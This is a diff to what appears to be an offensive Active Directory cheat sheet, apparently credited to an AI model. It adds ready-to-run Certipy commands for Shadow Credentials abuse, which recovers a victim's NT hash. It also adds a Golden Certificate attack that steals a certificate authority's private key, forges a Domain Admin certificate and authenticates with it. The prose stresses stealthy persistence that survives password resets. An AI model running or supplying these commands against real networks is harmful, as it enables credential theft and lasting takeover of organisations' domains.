@@ -295,6 +295,33 @@ secretsdump.py -k -no-pass dc01.corp.local
 
 ---
 
+## Shadow Credentials (`shadow`) — GenericWrite/GenericAll → NT hash
+
+If you have write access to a target's `msDS-KeyCredentialLink` (BloodHound `AddKeyCredentialLink`/`GenericWrite`/`GenericAll` edge), Certipy adds a device key, PKINIT-auths, and hands you the target's NT hash — no password reset, and it cleans up after itself:
+
+```bash
+# auto = add key → authenticate → recover NT hash → remove the key (one shot)
+certipy shadow auto -u attacker@corp.local -p 'Password' -account victim_user
+# manual sub-commands if you want to keep the key: add / list / clear / info
+```
+
+## Golden Certificate (`forge`) — CA key theft → forge any cert
+
+The strongest AD CS persistence/escalation: with the CA's own certificate + private key you forge a valid cert for **any** principal offline, bypassing all template controls (survives password resets; a true domain-persistence primitive).
+
+```bash
+# 1. Steal the CA cert + private key (needs local admin / SYSTEM on the CA host)
+certipy ca -backup -ca 'CORP-CA' -u admin@corp.local -p 'Password' -target ca.corp.local
+#    → CORP-CA.pfx   (or lift it with certsrv/DPAPI on-box)
+
+# 2. Forge a cert for Domain Admin, signed by the stolen CA key
+certipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'
+#    → administrator_forged.pfx
+
+# 3. Authenticate with it like any other cert
+certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.10
+```
+
 ## Certificate Account Persistence
 
 Certificates are valid for their full lifetime (commonly 1–3 years) even after a password reset — ideal for persistence.
@@ -355,5 +382,5 @@ certipy cert -pfx output.pfx -pem cert.pem -key key.pem
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-27*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
